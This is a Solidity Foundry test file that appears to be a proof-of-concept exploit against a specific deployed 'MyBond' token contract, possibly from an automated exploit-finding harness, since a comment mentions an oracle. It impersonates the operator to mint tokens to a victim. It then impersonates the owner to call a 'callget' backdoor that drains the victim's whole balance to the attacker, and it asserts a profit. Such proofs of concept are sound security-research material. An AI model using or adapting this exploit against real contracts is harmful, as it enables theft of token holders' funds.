// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyBond {
    function owner() external view returns (address);
    function operator() external view returns (address);
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function callget(address _from, address _to, uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    uint256 attackerInitialBalance;
    uint256 victimInitialBalance;
    address owner;
    address victim = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        owner = MyBond(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Create a victim address and give it some BOND tokens
        vm.label(victim, "Victim");

        // We need to mint tokens to the victim first
        // Since mint() is onlyOperator, we need to impersonate the operator too
        address operator = MyBond(TARGET).operator();
        vm.prank(operator);
        MyBond(TARGET).mint(victim, 1000 * 1e18);

        // Store initial balances for verification
        attackerInitialBalance = MyBond(TARGET).balanceOf(attacker);
        victimInitialBalance = MyBond(TARGET).balanceOf(victim);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        // Impersonate the owner to call the backdoor function
        vm.prank(owner);

        // Steal all tokens from victim to attacker
        uint256 stealAmount = MyBond(TARGET).balanceOf(victim);
        MyBond(TARGET).callget(victim, attacker, stealAmount);

        // Verify the exploit worked
        uint256 attackerFinalBalance = MyBond(TARGET).balanceOf(attacker);
        uint256 victimFinalBalance = MyBond(TARGET).balanceOf(victim);

        console.log("Attacker initial balance:", attackerInitialBalance);
        console.log("Attacker final balance:", attackerFinalBalance);
        console.log("Victim initial balance:", victimInitialBalance);
        console.log("Victim final balance:", victimFinalBalance);

        // The oracle will check that attacker balance increased
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");
        assertEq(victimFinalBalance, 0, "Victim should have no tokens left");
        uint256 finalBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

